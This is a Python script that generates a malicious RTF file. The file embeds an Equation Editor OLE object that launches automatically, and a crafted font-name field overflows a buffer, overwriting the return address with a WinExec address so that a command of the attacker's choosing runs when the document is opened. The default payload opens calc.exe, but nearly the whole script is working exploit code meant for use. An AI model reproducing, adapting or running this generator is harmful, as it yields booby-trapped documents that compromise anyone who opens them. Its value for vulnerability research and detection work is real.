
OBJ_DATA_TEMPLATE = [
R"""
01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1
b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001
0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe
fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000
000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000
0000000000000000000000000000000000000000000000000000001400000000000000010043006f
006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000
00000000000000000000000000000000000000000000000000000000000000010000006600000000
00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000003
0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffff01000002080000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02
ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e
30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000
00000000000000000000000000000000000000000000000000000000000000000000000000030004
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000
""",
R"""
00000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000004500710075
006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000
0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000
0000000000000000000000000000000000000000000000000000000000000004000000c500000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000ff
ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000001050000050000000d0000004d
45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500
000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00
050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00
ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65
7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001
90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131
0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131
31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000
0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff
7cef1800040000002d01010004000000f0010000030000000000
"""
]

CONTENT = [
	# RTF Header Section
	R'{\rtf1',						# RTF version
	R'\ansi',						# Charset
	R'\ansicpg1252'						# ANSI Code PageIn UnicodeRTF for Unicode-ANSI conversion
	R'\deff0\nouicompat',					# Basic Font
	R'\deflang1033',					# Basic Language when used this document
	R'{\fonttbl{\f0\fnil \froman\fcharset0\fprq2}}',	# Font Table
	R'{\*\generator Riched20 6.3.9600}',			# Generator
	R'\viewkind4\uc1',					# Document Read Mode
	R'\pard\sa200\sl276\slmult1',				# Paragraphs Text Attributes
	R'\f0\fs22\lang9',					# Character Text Attributes

	# Docuemnt Section
	R'{\object',						# Create OLE Object
	R'\objemb',						# Define Embeded OLE Object
	R'\objupdate',						# For EQNEDT32.EXE to execute Automatically
	R'{\*\objclass Equation.3}',				# Define Class
	R'\objw300\objh200',					# Define Object Width / Height
	R'{\*\objdata ',					# Insert data (= shellcode)
	'',							# <-------------- OBJ_DATA_TEMPLATE

	# Created RTF file includes the result of the last update of the object,
	# which may result in situations where the object is not recognized 
	# or does not use a particular type of object to replace the object 
	# with an object value previously.
	# Therefore, to prevent this, the following group should be inserted.
	R'}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260',

	# OBJECT TRAILER
	R'''0100090000039e00000002001c0000000000050000000902000000000500000002010100000005
0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002
1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000
0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000
0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000
002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100
000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a
0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300
00000000''',
	# END
	R'}}}\par}',		# Insert Paragraph mark
]

def create_rtf_file(fname, command):
	# if len(command) < 32:
		# print "[+] Font name is greater than 32 bytes for exploit successfully."
	# elif len(command) == 40:
		# print "[+] Font name should consist of '40 bytes + 4 bytes' for exploit successfully."
		# print "[+] Last 4 bytes should be 'return address'."
	if len(command) > 43:
		print "[+] length of Command should be shorter than 43 bytes."
	hex_command = command.encode('hex')

	EQNOLEFILEHDR = [
		R'1c00',		# WORD	chHdr		; Header Size = 28 = 0x001C
		R'00000200',		# DWORD	version		; Version Number  = 0x00020000
		R'9ec4',		# WORD	cf		; Clipboard format ID = 0xC49E
		R'a9000000',		# DWORD	cbObject	; length of data following this header = 169 = 0x000000A9
		R'00000000',		# DWORD reserved1	; not used
		R'00000000',		# DWORD reserved2	; not used
		R'00000000',		# DWORD reserved3	; not used
		R'00000000',		# DWORD	reserved4	; not used
	]
	MTEF_HEADER = [
		R'03',			# BYTE	bMtefVersion		; MTEF Version (0x03)
		R'01',			# BYTE	bPlatform		; Generator Platform (MAC: 0x00, Windows: 0x01)
		R'01',			# BYTE	bProduct		; Generator Product (MathType: 0x00, Equation Editor: 0x01)
		R'03',			# BYTE	bProductVersion		; Product Version
		R'0a',			# BYTE	bProductSubVersion	; Product Sub Version
	]
	MTEF_BYTE_STREAM_DATA = [
		R'0a',			# BYTE	initialSizeRecord	; Initial Size of Font = 10 = 0xA
		R'01',			# BYTE	lineOrPileRecord	; LINE Record Size = 1 = 0x01
		R'',			# BYTE	contentsOfRecord	; This is Font Record
		R'',			# BYTE	endRecord		;
	]

	FONT_RECORD = [
		R'08',			# BYTE	bTag		; Font Tag = 8 = 0x08
		R'5a',			# BYTE	bTypeFace	; Type Face = 90 = 0x5A
		R'01',			# BYTE	bStyle		; Style (italic: 0x01, bold: 0x02)

		# BYTE	bFontName[n]	; Font Name <--- Shellcode Here !
		R'''4141414141414141414141414141414141414141414141
		414141414141414141414141414141414141414141120c43''',
		# 0x430c12 is address of 'WinExec'
		# 44 bytes : Dummy or Command
		# Last 4 bytes : return address (use 0x430c12)
	]

	# 16 is index of objdata end in CONTENT array
	FONT_RECORD[-1] = hex_command + FONT_RECORD[-1][len(hex_command):]
	objdata = ''.join(EQNOLEFILEHDR + MTEF_HEADER + MTEF_BYTE_STREAM_DATA + FONT_RECORD)
	CONTENT[15] = OBJ_DATA_TEMPLATE[0] + objdata + OBJ_DATA_TEMPLATE[1]
    
	with open(fname, 'w') as f:
		contents = "".join(CONTENT)
		f.write(contents)
	

if __name__ == '__main__':
	FILE_NAME = 'exploit_by_eunjin.rtf'
	
	COMMAND = 'cmd.exe /c calc.exe '
	
	create_rtf_file(FILE_NAME, COMMAND)
	
	print '[+] Created RTF file'
